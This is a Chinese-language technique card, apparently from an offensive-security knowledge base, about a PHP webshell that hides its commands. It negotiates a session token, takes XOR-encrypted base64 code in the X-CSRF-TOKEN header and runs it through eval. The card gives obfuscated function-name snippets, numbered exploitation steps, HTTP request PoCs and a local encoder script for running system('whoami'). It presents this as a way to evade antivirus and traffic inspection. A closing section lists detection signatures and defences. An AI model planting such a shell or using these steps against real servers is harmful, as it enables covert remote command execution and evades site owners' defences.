---
id: web-php-rce-webshell-session-token-xor-csrf-header
title: Token 协商 + X-CSRF-TOKEN 异或的自定义会话型 PHP WebShell
type: scenario
domain: web
path: web/php/rce
technique: session-token-xor-csrf-header-webshell
aliases:
- Token 协商免杀马
- X-CSRF-TOKEN 异或马
- set_token WebShell
- 会话令牌加密马
- 自定义加密 WebShell
tags:
- php
- webshell
- evasion
- encrypted-traffic
- xor
- session
- csrf-header
- base64
- eval
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-12'
verification:
  verified_by: verifier-V556
  verified_at: '2026-11-12T00:21:03+08:00'
  notes: '已对照原文全文与20张截图核对：Token 头触发 substr(md5(rand()),16) 会话令牌（图18 返回 Token: a2b3fca92539495e 与 PHPSESSID）、''DQHNGW''^''&0;+qc'' 拼 base64 与 chr 拼接 _decode、类 E 构造内二次 base64_decode 后 eval(null.e)、set_token 对令牌循环异或且对称可逆（图16 前代码）均与原文一致；三步 PoC 逐字核对——图19 decode.php 由 token+out=c3lzdGVtKCd3aG9hbWknKTsg 算出 AgEOSQIkN015dlcKVX4MDQNlCV0tNxJe，图20 带 Cookie 与 X-CSRF-TOKEN 请求回显 whoami 输出 laptop-o0rkdo96\12816。影响版本不适用（免杀手法卡），未设 affected_versions 正确。dedup 候选 xor-encoded-function-name、哥斯拉 AES 会话马、自定义 XOR gzip 流量等均为不同设计/防御取证卡，非同一链；dup-scan 无相关 pair。PoC 未在本机执行。'
---

## 一句话结论

这类 PHP WebShell 先用一次带 `Token` 头的请求让服务端生成随机 16 字符会话令牌并存入 `$_SESSION`，之后客户端把 `base64(PHP 代码)` 与会话令牌逐字节异或、再 base64 后放进 `X-CSRF-TOKEN` 请求头；服务端用异或拼出的 `base64_decode` 还原出代码并 `eval`。文件里没有明文 `system`/`assert`/`eval($_POST...)`，流量里也没有明文命令，可同时规避静态查杀与流量特征检测。

## 原理

- 入口逻辑：`isset($_SERVER["HTTP_TOKEN"])` 时生成 `substr(md5(rand()),16)` 作为令牌存入 `$_SESSION['token']` 并通过响应头 `Token:` 返回；否则要求会话中已有 token，取 `X-CSRF-TOKEN` 头，用异或拼出的 `base64_decode` 解出密文，再经 `set_token()` 与会话令牌异或。
- 函数名混淆：
  ```php
  $b = 'DQHNGW' ^ '&0;+qc';       // "base64"
  $b .= '_dec' . chr(111) . 'de'; // "_decode" -> base64_decode
  $c = ('ZSLQWR' ^ '82?4af') . "_d" . "eco" . chr(108-8) . "e"; // 同样拼出 base64_decode
  ```
  源码中不出现 `base64_decode` 字面量，只有两段看似随机的字符串与 `chr()` 运算。
- 加解密：`set_token($v,$t)` 逐字符 `chr(ord($v[$x]) ^ ord($t[$x % strlen($t)]))`。虽然写成了复杂的 `substr($t, $x%len, ($x+1)%len)` 形式，`ord()` 只取子串首字节，实际就是对会话令牌做循环异或；异或对称，客户端可用同一函数由“明文目标 + 令牌”算出请求头密文。
- 执行：`new E($p)` 的构造函数再用上面拼出的 `base64_decode` 解码 `$p`（即 `base64(PHP 代码)`），`eval(null.$e."")` 执行。整个文件里没有函数名明文，也没有从 `$_POST`/`$_GET` 直接进入 `eval` 的污点路径。
- 令牌协商的意义：密钥在会话中随机生成、每次 `Token` 请求都会刷新，攻击者必须先取一次令牌再构造密文；这使得基于固定密钥（如哥斯拉默认密钥）的流量解密规则失效，也让重放旧请求失败。
- 为什么能免杀：静态扫描看到的是 session、header、异或循环、base64 解码等“业务代码”；动态流量里 `X-CSRF-TOKEN` 是随机密文，没有明文命令与敏感参数名。原文称该样本捕获于大型攻防演练，可绕过一众查杀引擎。

## 触发条件

- 目标存在任意 PHP 文件写入/上传点，能投放该脚本（免杀是投放后的规避层）。
- PHP 启用 session（默认），且 Web 服务器允许自定义请求头透传（Nginx/Apache 默认允许）。
- 攻击者能按同样的异或规则在本地计算 `X-CSRF-TOKEN`（脚本已给出）。

## 利用步骤

1. **密钥协商**：向木马发一次带任意 `Token` 头的请求，例如 `Token: 1`；响应头返回服务器生成的 `Token: <16 位>`，同时 `Set-Cookie` 给出 `PHPSESSID`。注意此步只做一次，之后不要再带 `Token` 头（会刷新令牌）。
2. **计算 X-CSRF-TOKEN**：本地用同样的异或函数处理 `base64(要执行的 PHP 代码)` 与会话令牌，再 base64 编码。例如执行 `system('whoami');`：
   - 明文目标 `$r = base64("system('whoami');") = c3lzdGVtKCd3aG9hbWknKTsg`；
   - `$v = XOR($r, $token)`；
   - 请求头值 `= base64($v)`（原文示例得到 `AgEOSQIkN015dlcKVX4MDQNlCV0tNxJe`）。
3. **执行命令**：用第一步的 `PHPSESSID` Cookie 和计算出的 `X-CSRF-TOKEN` 头发 POST（请求体可为空），服务端异或→base64 解码→eval，响应中出现命令结果。
4. 后续每条命令重复第 2-3 步（令牌不变），或自己写客户端封装。

## PoC

```http
GET /muma.php HTTP/1.1
Host: target
Token: 1
Content-Length: 0
```

```text
# 响应
Set-Cookie: PHPSESSID=6g4sgte2t8nnv65u8er5cfdtnq; path=/
Token: a2b3fca92539495e
```

```php
<?php
// 本地 decode.php：由目标明文 $r 与令牌 $t 反推请求头密文
function set_token($v, $t) {
    $r = "";
    for ($x = 0; $x < strlen($v); $x++) {
        if (($x + 1) % strlen($t) != 0) {
            $r .= chr(ord(substr($v, $x, $x + 1)) ^ ord(substr($t, $x % strlen($t), ($x + 1) % strlen($t))));
        } else {
            $r .= chr(ord(substr($v, $x, $x + 1)) ^ ord(substr($t, $x % strlen($t), 16)));
        }
    }
    return $r;
}
$t = $_POST['token'];                    // 第一步返回的 Token
$r = $_POST['out'];                      // base64("system('whoami');")
echo base64_encode(set_token($r, $t));   // 得到 X-CSRF-TOKEN 值
```

```http
POST /muma.php HTTP/1.1
Host: target
Cookie: PHPSESSID=6g4sgte2t8nnv65u8er5cfdtnq;
X-CSRF-TOKEN: AgEOSQIkN015dlcKVX4MDQNlCV0tNxJe
Content-Length: 0
```

```text
# 预期响应包含 whoami 输出（原文为 Windows 主机名\用户名）
```

## 变体与关联

- 变体：令牌可用会话之外的其他协商方式（时间戳、Cookie 随机值、服务端下发 nonce），异或换成 AES/RC4 等对称算法即可得到不同家族；核心是「每次会话协商密钥 + 密文放请求头 + 运行时拼函数名」。
- 关联：[[web-php-rce-godzilla-aes-session-webshell-disguise]]（哥斯拉 AES-128-ECB + 会话存储的另一类加密马；本卡是 XOR + 自定义 Token 头协商，流量与实现均不同）。
- 关联：[[web-php-rce-webshell-xor-encoded-function-name]]、[[web-php-rce-webshell-callback-wrapper-variable-function-regex-bypass]]（函数名异或/动态调用的静态免杀基础）；[[web-php-rce-webshell-pack-hex-substr-param-encode]]（同文章的另一种参数编码马）。
- 边界：会话令牌依赖 `session_start()` 与 Cookie；若目标禁用 session 或每次请求重建会话（无 Cookie 透传），该马无法完成三步协商。

## 检测与防御

- 检测：请求头中出现 `X-CSRF-TOKEN` 但请求体为空、且同一 `PHPSESSID` 先有一条只带 `Token` 头的 GET，是明显的协商-执行两段式特征；`Token` 响应头由普通业务页面返回也属异常。
- 检测：源码中同时出现 `$_SESSION['token']`、`HTTP_X_CSRF_TOKEN`、异或循环、`chr()`/字符串异或拼 `base64_decode`、`eval` 组合时，应作为高可疑样本；结合 AST/污点分析追踪 `X-CSRF-TOKEN` → base64 → 异或 → eval 的数据流。
- 防御：上传目录禁止脚本执行；对上传文件做多引擎扫描与沙箱；RASP 在 `eval`/动态调用处拦截；Web 服务器对无业务意义的自定义请求头做日志与告警。
- 防御：发现此类马后应同时轮换会话密钥/清理 session、排查同目录其他落地文件，并审计上传入口。
